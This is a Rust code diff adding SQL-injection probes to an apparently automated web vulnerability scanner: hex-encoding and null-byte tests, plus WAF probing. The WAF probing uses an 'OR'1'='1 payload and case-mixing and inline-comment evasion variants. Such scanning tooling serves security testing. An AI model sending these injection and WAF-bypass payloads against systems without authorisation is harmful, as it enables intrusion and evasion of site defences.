@@ -79,6 +79,24 @@ impl SideChannelAnalyzer {
         all_signals.extend(arith_signals);
 
         // ================================================================
+        // Test 5: Hex encoding evaluation (0x61646D696E = admin)
+        // ================================================================
+        let hex_signals = self.analyze_hex_encoding(base_url, parameter, baseline).await;
+        all_signals.extend(hex_signals);
+
+        // ================================================================
+        // Test 6: Null byte truncation (value%00garbage = value)
+        // ================================================================
+        let null_signals = self.analyze_null_byte(base_url, parameter, baseline).await;
+        all_signals.extend(null_signals);
+
+        // ================================================================
+        // Test 7: WAF detection (use blocked payloads as oracle)
+        // ================================================================
+        let waf_signals = self.analyze_waf_behavior(base_url, parameter, baseline).await;
+        all_signals.extend(waf_signals);
+
+        // ================================================================
         // Combine all signals
         // ================================================================
         let result = self.combiner.combine(&all_signals);
@@ -278,6 +296,222 @@ impl SideChannelAnalyzer {
         }
 
         signals
+    }
+
+    /// Analyze hex encoding evaluation
+    ///
+    /// Tests if 0x61646D696E returns same as 'admin'
+    /// If SQL decodes hex, they'll match → SQLi confirmed
+    async fn analyze_hex_encoding(
+        &self,
+        base_url: &str,
+        parameter: &str,
+        baseline: &HttpResponse,
+    ) -> Vec<Signal> {
+        let mut signals = Vec::new();
+
+        // Get current parameter value
+        let current_value = self.extract_param_value(base_url, parameter)
+            .unwrap_or_else(|| "admin".to_string());
+
+        // Convert value to hex: 'admin' → 0x61646D696E
+        let hex_value = format!("0x{}", current_value.bytes()
+            .map(|b| format!("{:02x}", b))
+            .collect::<String>());
+
+        let hex_url = self.build_test_url(base_url, parameter, &hex_value);
+
+        if let Ok(hex_resp) = self.http_client.get(&hex_url).await {
+            let similarity = self.calculate_similarity(baseline, &hex_resp);
+
+            if similarity > 0.85 {
+                // Hex was decoded by SQL!
+                signals.push(Signal::new(
+                    SignalType::HexEncoding,
+                    0.92,
+                    similarity,
+                    &format!("Hex encoding {} decoded to match baseline", hex_value),
+                ));
+            } else if similarity < 0.3 {
+                // Different response - hex not decoded (normal)
+                // No signal either way
+            }
+        }
+
+        signals
+    }
+
+    /// Analyze null byte truncation
+    ///
+    /// Tests if value%00garbage returns same as value
+    /// If SQL truncates at null, they'll match → SQLi indicator
+    async fn analyze_null_byte(
+        &self,
+        base_url: &str,
+        parameter: &str,
+        baseline: &HttpResponse,
+    ) -> Vec<Signal> {
+        let mut signals = Vec::new();
+
+        let current_value = self.extract_param_value(base_url, parameter)
+            .unwrap_or_else(|| "test".to_string());
+
+        // Test: value%00garbage (null byte + junk)
+        let null_payload = format!("{}%00randomjunk12345", current_value);
+        let null_url = self.build_test_url(base_url, parameter, &null_payload);
+
+        if let Ok(null_resp) = self.http_client.get(&null_url).await {
+            let similarity = self.calculate_similarity(baseline, &null_resp);
+
+            if similarity > 0.85 {
+                // Null byte truncated the junk!
+                signals.push(Signal::new(
+                    SignalType::NullByteTrunc,
+                    0.88,
+                    similarity,
+                    "Null byte truncation detected (junk after %00 ignored)",
+                ));
+            }
+        }
+
+        // Also test with actual null byte (not URL encoded)
+        let null_payload2 = format!("{}\x00morejunk", current_value);
+        let null_url2 = self.build_test_url(base_url, parameter, &null_payload2);
+
+        if let Ok(null_resp2) = self.http_client.get(&null_url2).await {
+            let similarity = self.calculate_similarity(baseline, &null_resp2);
+
+            if similarity > 0.85 && signals.is_empty() {
+                signals.push(Signal::new(
+                    SignalType::NullByteTrunc,
+                    0.85,
+                    similarity,
+                    "Raw null byte truncation detected",
+                ));
+            }
+        }
+
+        signals
+    }
+
+    /// Analyze WAF behavior as oracle
+    ///
+    /// If WAF blocks some payloads but not others, that tells us:
+    /// 1. There IS a WAF (context info)
+    /// 2. What the WAF thinks is dangerous (inverted signal)
+    /// 3. What bypasses work (if bypass works + behavior change = likely vuln)
+    async fn analyze_waf_behavior(
+        &self,
+        base_url: &str,
+        parameter: &str,
+        baseline: &HttpResponse,
+    ) -> Vec<Signal> {
+        let mut signals = Vec::new();
+
+        let current_value = self.extract_param_value(base_url, parameter)
+            .unwrap_or_else(|| "1".to_string());
+
+        // Test 1: Obviously malicious payload (should be blocked by WAF)
+        let obvious_sqli = format!("{}'OR'1'='1", current_value);
+        let obvious_url = self.build_test_url(base_url, parameter, &obvious_sqli);
+
+        let obvious_resp = self.http_client.get(&obvious_url).await.ok();
+        let obvious_blocked = obvious_resp.as_ref()
+            .map(|r| self.is_waf_block(r))
+            .unwrap_or(false);
+
+        // Test 2: Evasion payload (might bypass WAF)
+        let bypass_sqli = format!("{}'+oR+'1'='1", current_value);  // Case mixing
+        let bypass_url = self.build_test_url(base_url, parameter, &bypass_sqli);
+
+        let bypass_resp = self.http_client.get(&bypass_url).await.ok();
+        let bypass_blocked = bypass_resp.as_ref()
+            .map(|r| self.is_waf_block(r))
+            .unwrap_or(false);
+
+        // Test 3: Another evasion (inline comment)
+        let bypass2_sqli = format!("{}'+/**/OR/**/+'1'='1", current_value);
+        let bypass2_url = self.build_test_url(base_url, parameter, &bypass2_sqli);
+
+        let bypass2_resp = self.http_client.get(&bypass2_url).await.ok();
+        let bypass2_blocked = bypass2_resp.as_ref()
+            .map(|r| self.is_waf_block(r))
+            .unwrap_or(false);
+
+        // Analyze WAF behavior patterns
+        if obvious_blocked {
+            // WAF is present and blocking SQLi
+            signals.push(Signal::new(
+                SignalType::WafBlock,
+                0.6,  // WAF blocking = payload is "dangerous" (indirect evidence)
+                1.0,
+                "WAF detected: blocking obvious SQLi patterns",
+            ));
+
+            // Check if bypass worked
+            if !bypass_blocked || !bypass2_blocked {
+                // Bypass worked!
+                if let Some(ref bypass_r) = bypass_resp {
+                    if !bypass_blocked {
+                        let sim = self.calculate_similarity(baseline, bypass_r);
+                        if sim > 0.7 {
+                            signals.push(Signal::new(
+                                SignalType::WafBypass,
+                                0.75,
+                                sim,
+                                "WAF bypass succeeded (case mixing)",
+                            ));
+                        }
+                    }
+                }
+
+                if let Some(ref bypass2_r) = bypass2_resp {
+                    if !bypass2_blocked {
+                        let sim = self.calculate_similarity(baseline, bypass2_r);
+                        if sim > 0.7 {
+                            signals.push(Signal::new(
+                                SignalType::WafBypass,
+                                0.78,
+                                sim,
+                                "WAF bypass succeeded (inline comments)",
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+
+        signals
+    }
+
+    /// Check if response indicates WAF block
+    fn is_waf_block(&self, resp: &HttpResponse) -> bool {
+        // Common WAF block indicators
+        if resp.status_code == 403 || resp.status_code == 406 || resp.status_code == 429 {
+            return true;
+        }
+
+        let body_lower = resp.body.to_lowercase();
+
+        // Common WAF signatures
+        let waf_patterns = [
+            "access denied",
+            "forbidden",
+            "blocked",
+            "security violation",
+            "waf",
+            "firewall",
+            "cloudflare",
+            "akamai",
+            "imperva",
+            "incapsula",
+            "sucuri",
+            "mod_security",
+            "request blocked",
+            "suspicious activity",
+        ];
+
+        waf_patterns.iter().any(|p| body_lower.contains(p))
     }
 
     /// Calculate similarity between two responses (0.0 to 1.0)
